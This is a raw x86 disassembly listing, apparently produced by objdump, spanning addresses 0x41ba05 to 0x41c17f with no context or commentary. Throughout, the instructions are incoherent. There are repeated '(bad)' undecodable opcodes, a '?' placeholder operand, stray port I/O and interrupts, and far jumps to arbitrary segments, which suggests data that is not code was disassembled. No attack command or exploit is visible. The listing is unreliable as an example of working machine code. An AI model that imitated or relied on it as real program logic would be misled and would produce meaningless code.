  41ba05:	clc    
  41ba06:	mov    ebx,0xd8719976
  41ba0b:	cmp    bh,BYTE PTR [ecx-0xb]
  41ba0e:	test   al,0xb6
  41ba10:	push   esp
  41ba11:	jb     0x41ba00
  41ba13:	dec    ebx
  41ba14:	dec    eax
  41ba15:	fst    QWORD PTR [ebx-0x16b9647e]
  41ba1b:	inc    edi
  41ba1c:	retf   
  41ba1d:	gs test eax,0x240fb307
  41ba23:	loope  0x41b9f1
  41ba25:	push   ds
  41ba26:	push   ebp
  41ba27:	aas    
  41ba28:	(bad)  
  41ba2a:	jmp    0x41ba0e
  41ba2c:	cmp    al,0xfa
  41ba2e:	rol    BYTE PTR [ecx-0x5],0x8e
  41ba32:	pusha  
  41ba33:	das    
  41ba34:	pop    ebx
  41ba35:	xchg   esi,eax
  41ba36:	mov    ebx,0xbddc44e0
  41ba3b:	stc    
  41ba3c:	ds ret 0x37fe
  41ba40:	pop    ebp
  41ba41:	mov    ch,0x8
  41ba43:	sbb    DWORD PTR [ebp-0x6e192125],esi
  41ba49:	cmp    DWORD PTR [esp+ebp*1+0x322c0b62],edx
  41ba50:	mov    ecx,eax
  41ba52:	ins    BYTE PTR es:[edi],dx
  41ba53:	aad    0xed
  41ba55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba56:	in     eax,0x76
  41ba58:	cmp    al,0xb8
  41ba5a:	fnstenv [edx-0x5893bfed]
  41ba60:	imul   esi,DWORD PTR [eax],0x4a98bfad
  41ba66:	and    ecx,DWORD PTR [ebx+0x369c438b]
  41ba6c:	add    al,BYTE PTR [ebp-0x73dbfb03]
  41ba72:	ins    DWORD PTR es:[edi],dx
  41ba73:	ret    0xc97a
  41ba76:	lahf   
  41ba77:	xor    al,0xde
  41ba79:	popf   
  41ba7a:	out    dx,al
  41ba7b:	shl    DWORD PTR [eax-0x3346bb6b],0x61
  41ba82:	jns    0x41bac3
  41ba84:	dec    DWORD PTR [esi]
  41ba86:	ficomp DWORD PTR gs:[edi+eiz*2-0x7f]
  41ba8b:	xor    eax,0xbbdb0b2
  41ba90:	xchg   esi,eax
  41ba91:	mov    ds:0xd7ebf83d,al
  41ba96:	call   0x1520:0xc7e8f6ec
  41ba9d:	adc    DWORD PTR [eax+0x3a15dc6e],ebp
  41baa3:	mov    ebx,0x449a0496
  41baa8:	push   es
  41baa9:	out    dx,al
  41baaa:	stos   BYTE PTR es:[edi],al
  41baab:	jae    0x41ba87
  41baad:	ins    BYTE PTR es:[edi],dx
  41baae:	popa   
  41baaf:	cmp    DWORD PTR [edx],ebp
  41bab1:	bound  ebx,QWORD PTR [esi-0x7fc65ca7]
  41bab7:	clc    
  41bab8:	idiv   BYTE PTR [eax-0x30cd6fa]
  41babe:	lds    edi,FWORD PTR [ecx+0x4fe26a81]
  41bac4:	les    edi,FWORD PTR [ebx+0x37]
  41bac7:	enter  0x7f90,0xe8
  41bacb:	mov    eax,0x844e3c0f
  41bad0:	cld    
  41bad1:	fwait
  41bad2:	clc    
  41bad3:	fwait
  41bad4:	clc    
  41bad5:	sub    eax,0x8c31c98
  41bada:	idiv   dl
  41badc:	cdq    
  41badd:	int    0x29
  41badf:	jge    0x41bacb
  41bae1:	loop   0x41bb32
  41bae3:	(bad)  
  41bae5:	ret    0x4ccf
  41bae8:	fwait
  41bae9:	pop    esp
  41baea:	jmp    0xabc5:0x7728f3b5
  41baf1:	call   0xbc5f9e85
  41baf6:	das    
  41baf7:	and    ah,BYTE PTR [eax-0x77c2ae16]
  41bafd:	mov    eax,0x92cbb0f8
  41bb02:	idiv   DWORD PTR [ebp+0x23]
  41bb05:	stc    
  41bb06:	icebp  
  41bb07:	pusha  
  41bb08:	sub    al,0xd3
  41bb0a:	pop    DWORD PTR [esi-0x35]
  41bb0d:	out    0xfb,eax
  41bb0f:	(bad)  
  41bb10:	sub    DWORD PTR [esi+0x7209ac56],esi
  41bb16:	push   edx
  41bb17:	mov    ?,WORD PTR [edx]
  41bb19:	pop    esp
  41bb1a:	icebp  
  41bb1b:	mov    ecx,DWORD PTR [eax-0x1e]
  41bb1e:	cmp    dl,al
  41bb20:	pusha  
  41bb21:	mov    edi,0x1aca472b
  41bb26:	push   es
  41bb27:	outs   dx,BYTE PTR ds:[esi]
  41bb28:	push   esi
  41bb29:	inc    esp
  41bb2a:	push   cs
  41bb2b:	shr    DWORD PTR [eax],0x20
  41bb2e:	add    esp,ebx
  41bb30:	adc    eax,0x62c4ec20
  41bb35:	xchg   edi,eax
  41bb36:	cmp    dh,BYTE PTR [edi-0x6968a8df]
  41bb3c:	mov    dh,0xd2
  41bb3e:	inc    esi
  41bb3f:	mov    ch,0x8
  41bb41:	mov    al,0x7d
  41bb43:	loope  0x41bb7c
  41bb45:	rcl    dh,cl
  41bb47:	imul   BYTE PTR [ebx-0x10]
  41bb4a:	sbb    esi,eax
  41bb4c:	push   eax
  41bb4d:	mov    bl,0x28
  41bb4f:	xor    al,0x9a
  41bb51:	adc    eax,0x44257b21
  41bb56:	push   0xec97f3b3
  41bb5b:	pop    esi
  41bb5c:	imul   edx,DWORD PTR [ecx+0x2e],0x25
  41bb60:	in     eax,dx
  41bb61:	cli    
  41bb62:	popa   
  41bb63:	push   ds
  41bb64:	mov    ecx,0x7cd0fa8e
  41bb69:	push   ebx
  41bb6a:	mov    ch,0xb
  41bb6c:	pop    ecx
  41bb6d:	shl    BYTE PTR [ebp+0x44],0xe0
  41bb71:	repnz cmc 
  41bb73:	xchg   bl,dl
  41bb75:	mov    al,ds:0x56527fd6
  41bb7a:	jns    0x41bba1
  41bb7c:	fchs   
  41bb7e:	push   esi
  41bb7f:	lods   eax,DWORD PTR ds:[esi]
  41bb80:	aad    0x42
  41bb82:	int3   
  41bb83:	call   DWORD PTR [edi-0x5479230c]
  41bb89:	rcl    ebx,1
  41bb8b:	add    al,cl
  41bb8d:	push   0x2d
  41bb8f:	stos   DWORD PTR es:[edi],eax
  41bb90:	jge    0x41bb7a
  41bb92:	leave  
  41bb93:	xor    BYTE PTR [eax],bh
  41bb95:	mov    bh,0x15
  41bb97:	sbb    ah,BYTE PTR [ebx+0x4e4d28e7]
  41bb9d:	(bad)  [edx-0x5c]
  41bba0:	(bad)  
  41bba1:	in     eax,0x8
  41bba3:	mov    ds:0x693e54e6,eax
  41bba8:	pop    ecx
  41bba9:	dec    esi
  41bbaa:	mov    BYTE PTR [esi+0x56ed8d80],ah
  41bbb0:	sbb    BYTE PTR [esi+0x1acd0205],ah
  41bbb6:	das    
  41bbb7:	inc    esp
  41bbb8:	mov    ds:0x6158e4b9,eax
  41bbbd:	mov    BYTE PTR [ecx+eax*2+0x37decb27],ah
  41bbc4:	out    dx,al
  41bbc5:	pushf  
  41bbc6:	out    0xef,al
  41bbc8:	cmc    
  41bbc9:	retf   0x909e
  41bbcc:	add    BYTE PTR [ebx+0x1a],bh
  41bbcf:	pop    ds
  41bbd0:	mov    edi,0x61a55b2a
  41bbd5:	lods   eax,DWORD PTR ds:[esi]
  41bbd6:	mov    ecx,DWORD PTR [ebx]
  41bbd8:	into   
  41bbd9:	mov    edi,0x2555b46c
  41bbde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbdf:	push   ecx
  41bbe0:	or     bl,bl
  41bbe2:	jns    0x41bbef
  41bbe4:	and    BYTE PTR [ebp+0xc],bl
  41bbe7:	mov    esi,0xf6f3f6bd
  41bbec:	loopne 0x41bbc1
  41bbee:	sbb    dl,BYTE PTR [edx]
  41bbf0:	inc    esp
  41bbf1:	addr16 out 0x6,al
  41bbf4:	mov    esi,esi
  41bbf6:	mov    esp,0xcaa6ff32
  41bbfb:	adc    BYTE PTR [eax],al
  41bbfd:	in     eax,dx
  41bbfe:	faddp  st(1),st
  41bc00:	sbb    ebp,DWORD PTR [eax-0x723b5b8b]
  41bc06:	push   ebp
  41bc07:	lds    esp,FWORD PTR [ebx-0x4479b762]
  41bc0d:	xchg   esi,eax
  41bc0e:	fistp  DWORD PTR [esi+0x6ed9667]
  41bc14:	pop    ds
  41bc15:	xor    eax,esi
  41bc17:	int    0x27
  41bc19:	out    0xc6,eax
  41bc1b:	pop    ds
  41bc1c:	imul   BYTE PTR [esi-0x202b3d65]
  41bc22:	xlat   BYTE PTR ds:[ebx]
  41bc23:	sbb    eax,DWORD PTR [ecx+0x6bd57848]
  41bc29:	push   ecx
  41bc2a:	dec    esp
  41bc2b:	pop    eax
  41bc2c:	lea    ecx,[ebp-0x47b09d1d]
  41bc32:	dec    edx
  41bc33:	cmp    BYTE PTR [ebx+edx*2],0xac
  41bc37:	mov    ebp,0x38296a8c
  41bc3c:	sub    al,0x85
  41bc3e:	sub    ebp,DWORD PTR [ecx+0x7de99493]
  41bc44:	mov    eax,0x28c61988
  41bc49:	shl    DWORD PTR [esi+0x238bdf1f],0xdd
  41bc50:	sbb    ecx,DWORD PTR [ecx+ebx*2]
  41bc53:	dec    eax
  41bc54:	lods   al,BYTE PTR ds:[esi]
  41bc55:	fiadd  WORD PTR [edx]
  41bc57:	rol    BYTE PTR [ecx-0x330f0223],cl
  41bc5d:	inc    eax
  41bc5e:	xor    al,0xc7
  41bc60:	aad    0x40
  41bc62:	andps  xmm2,xmm4
  41bc65:	or     DWORD PTR [esi],eax
  41bc67:	dec    eax
  41bc68:	or     cl,BYTE PTR [ecx]
  41bc6a:	sub    eax,DWORD PTR [ebp+0x7c175ab7]
  41bc70:	push   ebx
  41bc71:	sub    eax,0x9c7d01f8
  41bc76:	adc    eax,0x54f43b47
  41bc7b:	data16 (bad) 
  41bc7d:	mov    edi,0x6b49bda6
  41bc82:	mov    ecx,es
  41bc84:	dec    esp
  41bc85:	push   ebx
  41bc86:	enter  0xf611,0x9b
  41bc8a:	add    esi,edi
  41bc8c:	loope  0x41bc31
  41bc8e:	add    dh,ch
  41bc90:	(bad)  
  41bc91:	out    dx,eax
  41bc92:	lds    ebx,FWORD PTR [edi-0x49]
  41bc95:	jp     0x41bc78
  41bc97:	add    BYTE PTR [esi],bl
  41bc99:	(bad)  
  41bc9a:	sbb    DWORD PTR gs:[esi+0x7b],ebx
  41bc9e:	retf   
  41bc9f:	sbb    edi,DWORD PTR [ebp-0x6f]
  41bca2:	xchg   ebx,eax
  41bca3:	outs   dx,DWORD PTR ds:[esi]
  41bca4:	lea    ebx,[eax]
  41bca6:	sbb    DWORD PTR [ebx],ebx
  41bca8:	cmp    eax,0xbcfa8d67
  41bcad:	add    al,0x7d
  41bcaf:	mov    ebx,0xdea50c05
  41bcb4:	xchg   DWORD PTR [esi-0x67e5d8e8],esi
  41bcba:	pop    esp
  41bcbb:	dec    esi
  41bcbc:	es adc eax,0x3d2ac5bb
  41bcc2:	fisttp DWORD PTR [edi]
  41bcc4:	jb     0x41bd2e
  41bcc6:	xor    ebx,DWORD PTR [eax]
  41bcc8:	stos   BYTE PTR es:[edi],al
  41bcc9:	push   ds
  41bcca:	fiadd  DWORD PTR [eax]
  41bccc:	sub    ebp,DWORD PTR ds:0x2639943d
  41bcd2:	mov    es,WORD PTR [ecx-0x20]
  41bcd5:	or     DWORD PTR ds:0x3233da19,0x36
  41bcdc:	ds push ds
  41bcde:	sbb    DWORD PTR [ecx],esp
  41bce0:	clc    
  41bce1:	faddp  st(4),st
  41bce3:	arpl   WORD PTR [ebx-0x4555a5b5],bx
  41bce9:	pop    edi
  41bcea:	mov    dl,0xb2
  41bcec:	sub    eax,edi
  41bcee:	xor    BYTE PTR [edi],dh
  41bcf0:	ins    DWORD PTR es:[edi],dx
  41bcf1:	push   ds
  41bcf2:	lahf   
  41bcf3:	ret    
  41bcf4:	test   eax,0xd0ff1893
  41bcf9:	imul   esi,DWORD PTR [edi],0xffffff9d
  41bcfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcfd:	and    DWORD PTR [edi-0x8a946db],eax
  41bd03:	xchg   esp,eax
  41bd04:	sub    ebp,DWORD PTR [ecx-0x31]
  41bd07:	mov    al,0xd4
  41bd09:	mov    dl,BYTE PTR [edx-0x46]
  41bd0c:	inc    eax
  41bd0d:	push   edi
  41bd0e:	dec    ebx
  41bd0f:	xchg   esi,eax
  41bd10:	aad    0xf2
  41bd12:	xchg   edx,eax
  41bd13:	mov    esp,DWORD PTR [edi]
  41bd15:	in     eax,0x56
  41bd17:	sub    DWORD PTR [ebp-0x59],edx
  41bd1a:	iret   
  41bd1b:	mov    ds:0xb124af96,eax
  41bd20:	or     DWORD PTR [edi+0x44],ebp
  41bd23:	cld    
  41bd24:	xlat   BYTE PTR ds:[ebx]
  41bd25:	mov    cl,BYTE PTR [ecx+0x63]
  41bd28:	inc    edi
  41bd29:	ins    BYTE PTR es:[edi],dx
  41bd2a:	fimul  DWORD PTR [eax+0x5c]
  41bd2d:	sub    al,0x95
  41bd2f:	jecxz  0x41bd48
  41bd31:	lock xchg edi,eax
  41bd33:	fmul   DWORD PTR [edx+edi*4-0x1dade516]
  41bd3a:	fld    QWORD PTR [edx+ecx*8+0x3e]
  41bd3e:	clc    
  41bd3f:	or     BYTE PTR [ecx+ecx*1-0x18d02d27],ch
  41bd46:	test   eax,0xef59a757
  41bd4c:	jg     0x41bd5f
  41bd4e:	dec    esi
  41bd4f:	xchg   ebp,esi
  41bd51:	ror    bh,1
  41bd53:	das    
  41bd54:	scas   eax,DWORD PTR es:[edi]
  41bd55:	nop
  41bd56:	xchg   DWORD PTR [edx],edi
  41bd58:	sub    al,0xd6
  41bd5a:	xchg   esi,eax
  41bd5b:	pop    ebx
  41bd5c:	outs   dx,BYTE PTR ds:[esi]
  41bd5d:	mov    ecx,DWORD PTR [edi]
  41bd5f:	adc    eax,0xf905f672
  41bd64:	mov    ds:0x15d008ad,al
  41bd69:	aaa    
  41bd6a:	jns    0x41bd18
  41bd6c:	inc    esp
  41bd6d:	int    0xfc
  41bd6f:	mov    esi,0x5ebd1895
  41bd74:	js     0x41bd1f
  41bd76:	scas   eax,DWORD PTR es:[edi]
  41bd77:	jle    0x41bdd8
  41bd79:	mov    cl,0xc8
  41bd7b:	or     bh,BYTE PTR [esi]
  41bd7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd7e:	mov    bl,0x6
  41bd80:	xor    ch,BYTE PTR [ebp+0x219b5454]
  41bd86:	push   ds
  41bd87:	call   0xaddd:0x4a59eb83
  41bd8e:	shr    DWORD PTR [ecx-0xf],cl
  41bd91:	mov    edi,0xae8b7a4f
  41bd96:	fst    QWORD PTR [ebx]
  41bd98:	mov    dl,0x59
  41bd9a:	pop    es
  41bd9b:	retf   
  41bd9c:	sbb    DWORD PTR [ebp+0x21117714],edx
  41bda2:	jae    0x41bded
  41bda4:	pop    eax
  41bda5:	pop    edx
  41bda6:	xor    BYTE PTR [edx+0x30deb74],dl
  41bdac:	mov    bh,0x89
  41bdae:	(bad)  
  41bdb0:	int3   
  41bdb1:	cs and al,0x27
  41bdb4:	push   ebp
  41bdb5:	push   DWORD PTR [edx+esi*1+0x6c]
  41bdb9:	sbb    eax,0x743c52ae
  41bdbe:	mov    ebp,0xeb8afd52
  41bdc3:	or     DWORD PTR [edx],ebx
  41bdc5:	add    dh,BYTE PTR [ebp-0x49e10086]
  41bdcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdcc:	or     edx,DWORD PTR [eax+ebp*1+0x7f]
  41bdd0:	xchg   edi,eax
  41bdd1:	dec    ecx
  41bdd2:	(bad)  
  41bdd3:	js     0x41bd56
  41bdd5:	cmp    ebp,esp
  41bdd7:	inc    esi
  41bdd8:	jl     0x41bda8
  41bdda:	enter  0x75a2,0xb1
  41bdde:	sbb    ecx,edi
  41bde0:	into   
  41bde1:	add    cl,ah
  41bde3:	dec    edi
  41bde4:	cmp    ebp,esp
  41bde6:	xor    eax,0x40b88da8
  41bdeb:	mov    bh,0x63
  41bded:	mov    dh,0x42
  41bdef:	push   ss
  41bdf0:	es stc 
  41bdf2:	es inc eax
  41bdf4:	pop    edi
  41bdf5:	ret    
  41bdf6:	fidiv  WORD PTR [esi]
  41bdf8:	(bad)  
  41bdf9:	loope  0x41bdc4
  41bdfb:	stos   BYTE PTR es:[edi],al
  41bdfc:	into   
  41bdfd:	scas   al,BYTE PTR es:[edi]
  41bdfe:	sub    BYTE PTR [ebx-0x530f89b1],bh
  41be04:	or     BYTE PTR [eax],cl
  41be06:	jnp    0x41bd8e
  41be08:	jbe    0x41be55
  41be0a:	mov    ebp,0xe94a7ba7
  41be0f:	dec    esi
  41be10:	dec    esi
  41be11:	or     dh,al
  41be13:	sub    DWORD PTR ds:0x4a98e8b0,edi
  41be19:	(bad)  
  41be1a:	paddd  mm2,mm5
  41be1d:	cs mov ecx,0x535fb968
  41be23:	ja     0x41be23
  41be25:	sahf   
  41be26:	dec    ebp
  41be27:	gs mov ebx,0x62dd2afe
  41be2d:	aas    
  41be2e:	xor    ecx,eax
  41be30:	test   al,0x13
  41be32:	mov    ebp,0x4a4b2bf
  41be37:	pop    edi
  41be38:	gs bound esp,QWORD PTR es:[esi+esi*4+0x7a]
  41be3e:	or     dl,dl
  41be40:	sbb    DWORD PTR [esi],eax
  41be42:	or     eax,0xfbd1d238
  41be47:	cmp    DWORD PTR [ecx+0xc4aa650],edx
  41be4d:	imul   esi,DWORD PTR [esp+eiz*2],0xe5c91973
  41be54:	pop    ebp
  41be55:	mov    fs,WORD PTR [esi+ecx*8+0x26]
  41be59:	ror    BYTE PTR [edx],1
  41be5b:	popf   
  41be5c:	jp     0x41be73
  41be5e:	cmp    al,0x79
  41be60:	sub    ebp,DWORD PTR [eax-0x3b8cd21c]
  41be66:	add    eax,0x4075291b
  41be6b:	jo     0x41bebc
  41be6d:	out    0xc0,eax
  41be6f:	push   ds
  41be70:	mov    edx,0xc0514d1e
  41be75:	fdivr  QWORD PTR [ebx+eiz*2-0x763e0c94]
  41be7c:	addr16 fcmovnu st,st(1)
  41be7f:	xchg   ebp,eax
  41be80:	fcomi  st,st(4)
  41be82:	iret   
  41be83:	inc    ecx
  41be84:	scas   al,BYTE PTR es:[edi]
  41be85:	es lock jp 0x41be54
  41be89:	lds    esp,FWORD PTR [edi+0x5600c54f]
  41be8f:	mov    esi,0x3c57c26c
  41be94:	sbb    eax,0x1b319ffd
  41be99:	fisub  WORD PTR ds:0xd60ae3cf
  41be9f:	pop    ss
  41bea0:	push   esp
  41bea1:	dec    ebx
  41bea2:	out    0xcc,eax
  41bea4:	cwde   
  41bea5:	in     eax,0xaf
  41bea7:	mov    eax,ds:0x6076772f
  41beac:	not    DWORD PTR ds:0x1f90ec96
  41beb2:	mov    ebx,0xf9997b67
  41beb7:	and    DWORD PTR [eax+0x34b07cc5],0xffffff85
  41bebe:	popf   
  41bebf:	gs push ebp
  41bec1:	add    al,ah
  41bec3:	jg     0x41be4a
  41bec5:	mov    cl,0x4c
  41bec7:	iret   
  41bec8:	imul   ecx,DWORD PTR [ebx+0x14],0xffffffb5
  41becc:	iret   
  41becd:	aaa    
  41bece:	pminub mm3,QWORD PTR [edx+0x2625ef65]
  41bed5:	shl    DWORD PTR [ecx+0x153a5346],0xd9
  41bedc:	int    0x71
  41bede:	xor    al,0x17
  41bee0:	lods   al,BYTE PTR ds:[esi]
  41bee1:	lea    ebp,[ebp+ecx*8+0x68e7113e]
  41bee8:	fistp  DWORD PTR ds:0x2151b5b2
  41beee:	xchg   edi,eax
  41beef:	lds    eax,FWORD PTR [ebx-0xe]
  41bef2:	xchg   esp,eax
  41bef3:	mov    eax,ds:0xa8368afb
  41bef8:	nop
  41bef9:	call   DWORD PTR [esi]
  41befb:	aam    0x5c
  41befd:	call   0xc037c852
  41bf02:	jle    0x41beef
  41bf04:	fldenv [edi+0x4c]
  41bf07:	inc    ebp
  41bf08:	in     al,0x55
  41bf0a:	test   BYTE PTR [ebp+ebp*2-0x6b],dl
  41bf0e:	int3   
  41bf0f:	and    ah,BYTE PTR [edi]
  41bf11:	cmp    cl,BYTE PTR [ebp+0x165b598e]
  41bf17:	out    dx,eax
  41bf18:	push   edx
  41bf19:	fst    DWORD PTR [ebx-0xf]
  41bf1c:	jp     0x41bf6b
  41bf1e:	sbb    esi,edx
  41bf20:	enter  0xda42,0x45
  41bf24:	and    DWORD PTR [ebx-0x6a],edi
  41bf27:	stos   BYTE PTR es:[edi],al
  41bf28:	and    al,BYTE PTR [edi]
  41bf2a:	loop   0x41bf50
  41bf2c:	lods   al,BYTE PTR ds:[esi]
  41bf2d:	inc    esp
  41bf2e:	inc    ebp
  41bf2f:	jmp    0xbf4889de
  41bf34:	push   esi
  41bf35:	jle    0x41bec9
  41bf37:	ret    
  41bf38:	setae  BYTE PTR [edx-0x28d43604]
  41bf3f:	cmp    eax,0x29c808c4
  41bf44:	loope  0x41bf5b
  41bf46:	mov    bl,0x78
  41bf48:	jge    0x41bf7d
  41bf4a:	ins    DWORD PTR es:[edi],dx
  41bf4b:	or     DWORD PTR [edx-0x6168a954],edx
  41bf51:	cmc    
  41bf52:	mov    al,BYTE PTR gs:[edx]
  41bf55:	inc    ebp
  41bf56:	imul   esp,DWORD PTR [ebx],0xffffffb7
  41bf59:	jmp    0xd9ed:0x6235e65
  41bf60:	fild   DWORD PTR [esp+esi*1+0x3a]
  41bf64:	jae    0x41bf92
  41bf66:	int    0x3c
  41bf68:	xor    ebp,ebx
  41bf6a:	cmp    BYTE PTR [edx],0x61
  41bf6d:	jge    0x41bfe7
  41bf6f:	sti    
  41bf70:	inc    edx
  41bf71:	loop   0x41bf2e
  41bf73:	push   edi
  41bf74:	xchg   ebx,eax
  41bf75:	test   DWORD PTR [esi+0x2c],ebp
  41bf78:	loop   0x41bf83
  41bf7a:	aaa    
  41bf7b:	xchg   esp,eax
  41bf7c:	dec    edi
  41bf7d:	ja     0x41bfaf
  41bf7f:	in     eax,dx
  41bf80:	pop    ds
  41bf81:	or     al,0x61
  41bf83:	pop    esp
  41bf84:	sar    BYTE PTR [edi-0x7a],0x67
  41bf88:	ficomp DWORD PTR [ecx]
  41bf8a:	or     cl,ah
  41bf8c:	add    DWORD PTR [ecx+0x2b],esi
  41bf8f:	add    al,0x36
  41bf91:	popa   
  41bf92:	and    edx,DWORD PTR [edi-0x27fad34]
  41bf98:	push   edx
  41bf99:	push   ds
  41bf9a:	loopne 0x41bff1
  41bf9c:	out    dx,al
  41bf9d:	jbe    0x41bf8a
  41bf9f:	bound  eax,QWORD PTR [edx]
  41bfa1:	jno    0x41bf67
  41bfa3:	hlt    
  41bfa4:	sbb    bh,BYTE PTR [ecx-0x2b]
  41bfa7:	call   0xf42:0xb2f4057
  41bfae:	push   ebx
  41bfaf:	xor    eax,0xce1a5fa
  41bfb4:	mov    al,ds:0x9cd6d0db
  41bfb9:	push   ebp
  41bfba:	mov    ecx,0x1c7e28e1
  41bfbf:	pop    edx
  41bfc0:	cld    
  41bfc1:	push   ebx
  41bfc2:	in     al,dx
  41bfc3:	pop    ebx
  41bfc4:	inc    edi
  41bfc5:	int    0x11
  41bfc7:	push   ss
  41bfc8:	push   0xa8c1f921
  41bfcd:	mov    edi,DWORD PTR [ebx]
  41bfcf:	repz or DWORD PTR [esi],0x6b
  41bfd3:	jae    0x41bf89
  41bfd5:	xor    ah,BYTE PTR [edi]
  41bfd7:	outs   dx,DWORD PTR ds:[esi]
  41bfd8:	mov    al,ds:0x57e0aa6d
  41bfdd:	or     DWORD PTR [ecx],0xffffff8c
  41bfe0:	mov    al,0x11
  41bfe2:	sti    
  41bfe3:	fs pop esi
  41bfe5:	clc    
  41bfe6:	repnz mov ds:0xc33536c,eax
  41bfec:	aaa    
  41bfed:	mov    esi,DWORD PTR [ebp-0x26]
  41bff0:	xchg   ecx,eax
  41bff1:	mov    dl,0x39
  41bff3:	stos   BYTE PTR es:[edi],al
  41bff4:	in     eax,dx
  41bff5:	xchg   edi,eax
  41bff6:	sub    ch,BYTE PTR ss:[esi+0x63]
  41bffa:	adc    ebp,DWORD PTR [eax+0x4f]
  41bffd:	fistp  WORD PTR [esi+ebx*1+0x77f7f27d]
  41c004:	in     al,0x6e
  41c006:	mov    ds:0x6405d3c5,eax
  41c00b:	mov    ch,0x3
  41c00d:	call   0x1eb4:0x171b1c54
  41c014:	jmp    0xdebecacb
  41c019:	jbe    0x41c02e
  41c01b:	mov    ds,ecx
  41c01d:	ret    0x8bd0
  41c020:	lods   al,BYTE PTR ds:[esi]
  41c021:	jle    0x41bfc3
  41c023:	enter  0x22ab,0x32
  41c027:	shl    DWORD PTR [edi-0x293d6f59],cl
  41c02d:	rcr    BYTE PTR [eax],0xf2
  41c030:	adc    BYTE PTR [esi-0x4f],bh
  41c033:	mov    eax,0xa9553b07
  41c038:	test   DWORD PTR [ebp-0x3a],edi
  41c03b:	data16 stos BYTE PTR es:[edi],al
  41c03d:	ret    0x7c17
  41c040:	arpl   WORD PTR [ecx],dx
  41c042:	sub    ebx,esi
  41c044:	mov    ah,0xde
  41c046:	dec    ecx
  41c047:	cld    
  41c048:	rcr    BYTE PTR [edx-0x2705df6f],cl
  41c04e:	sub    esi,ebx
  41c050:	pop    ebx
  41c051:	popa   
  41c052:	xchg   edx,eax
  41c053:	dec    esp
  41c054:	mov    ch,0x35
  41c056:	pop    edx
  41c057:	xor    DWORD PTR [edi-0x5d],edi
  41c05a:	jmp    0x41bff2
  41c05c:	call   0xb28e5be0
  41c061:	jno    0x41bfea
  41c063:	pop    esi
  41c065:	xchg   BYTE PTR [ecx-0xa7573c2],bl
  41c06b:	adc    DWORD PTR [edi+0x43d26a2b],0x76
  41c072:	mov    eax,ds:0x5c3e283e
  41c077:	or     ah,BYTE PTR [edx]
  41c079:	pop    es
  41c07a:	mov    esi,DWORD PTR [ebp-0x79]
  41c07d:	dec    esp
  41c07e:	gs jp  0x41c015
  41c081:	inc    esi
  41c082:	retf   
  41c083:	adc    DWORD PTR [edi+0x37],eax
  41c086:	sbb    al,ch
  41c088:	jae    0x41c087
  41c08a:	or     BYTE PTR [esi],cl
  41c08c:	adc    al,0x72
  41c08e:	retf   
  41c08f:	adc    al,BYTE PTR [ecx]
  41c091:	adc    BYTE PTR [ebx-0x10e8860a],bh
  41c097:	dec    ebp
  41c098:	lea    edi,[edi]
  41c09a:	mov    ecx,0x984bfbde
  41c09f:	add    edx,edx
  41c0a1:	int    0x3d
  41c0a3:	iret   
  41c0a4:	fldcw  WORD PTR [edi-0x5b]
  41c0a7:	add    al,0xde
  41c0a9:	stc    
  41c0aa:	mov    eax,ds:0x5c9c202c
  41c0af:	sbb    esi,0x4b
  41c0b2:	sahf   
  41c0b3:	sub    al,0xee
  41c0b5:	dec    eax
  41c0b6:	or     DWORD PTR [edx-0x2aa4eb7b],0x48c234bd
  41c0c0:	dec    edi
  41c0c1:	int3   
  41c0c2:	push   esi
  41c0c3:	das    
  41c0c4:	ja     0x41c130
  41c0c6:	scas   eax,DWORD PTR es:[edi]
  41c0c7:	xchg   esp,eax
  41c0c8:	pop    ebp
  41c0c9:	xor    cl,BYTE PTR [edx+0x3fed3721]
  41c0cf:	cmovle ebx,DWORD PTR [ecx-0xf1ff648]
  41c0d6:	jecxz  0x41c151
  41c0d8:	inc    ebx
  41c0d9:	addr16 mov ebx,0x6e58f5e7
  41c0df:	or     BYTE PTR [edx-0x2ecb1644],al
  41c0e5:	dec    esi
  41c0e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0e7:	xchg   ecx,eax
  41c0e8:	lods   eax,DWORD PTR ds:[esi]
  41c0e9:	outs   dx,BYTE PTR ds:[esi]
  41c0ea:	hlt    
  41c0eb:	xor    BYTE PTR [ecx],ch
  41c0ed:	adc    eax,DWORD PTR [edi]
  41c0ef:	fstp   QWORD PTR [esi+0x3af93ffc]
  41c0f5:	mov    ds:0x7a9391aa,eax
  41c0fa:	into   
  41c0fb:	mov    edx,0x48ab45b1
  41c100:	xor    al,0x2c
  41c103:	xlat   BYTE PTR ds:[ebx]
  41c104:	mov    esi,0xa8361e5f
  41c109:	lahf   
  41c10a:	int3   
  41c10b:	jle    0x41c18a
  41c10d:	sub    ebp,ecx
  41c10f:	dec    edx
  41c110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c111:	push   es
  41c112:	cmp    al,0xd8
  41c114:	mov    cl,0x14
  41c116:	dec    eax
  41c117:	pop    ebx
  41c118:	lock mov ah,0x73
  41c11b:	pop    eax
  41c11c:	pop    es
  41c11d:	jmp    0xb0b032c
  41c122:	add    ebx,DWORD PTR [ebp-0x1e]
  41c125:	ins    BYTE PTR es:[edi],dx
  41c126:	call   FWORD PTR [ebx]
  41c128:	pusha  
  41c129:	fcom   st(6)
  41c12b:	add    DWORD PTR [esi+0x2ed0464a],ebx
  41c131:	add    BYTE PTR [ebx-0xa],0xb7
  41c135:	(bad)  
  41c136:	data16 sbb bl,BYTE PTR [edi+0x12]
  41c13a:	inc    edx
  41c13b:	pop    esi
  41c13c:	(bad)  ds:0x6d956e7f
  41c142:	fst    QWORD PTR [eax-0x50]
  41c145:	nop
  41c146:	inc    ebx
  41c147:	loope  0x41c1b7
  41c149:	or     eax,0x93746076
  41c14e:	xchg   esp,eax
  41c14f:	jl     0x41c122
  41c151:	add    ah,BYTE PTR [ebp+0x2558622e]
  41c157:	xchg   BYTE PTR gs:[esi+0x35],dh
  41c15b:	mov    esp,0xc0d6b75
  41c160:	jge    0x41c116
  41c162:	mov    edi,0xf7208362
  41c167:	mov    WORD PTR [esi],es
  41c169:	cmp    bh,BYTE PTR [ebx+0x26850400]
  41c16f:	lea    ebx,ds:0xb0545c57
  41c175:	or     BYTE PTR [ecx-0x5c],ch
  41c178:	sub    cl,BYTE PTR [edx-0x5d8dbf57]
  41c17e:	(bad)  
  41c17f:	je     0x41c189
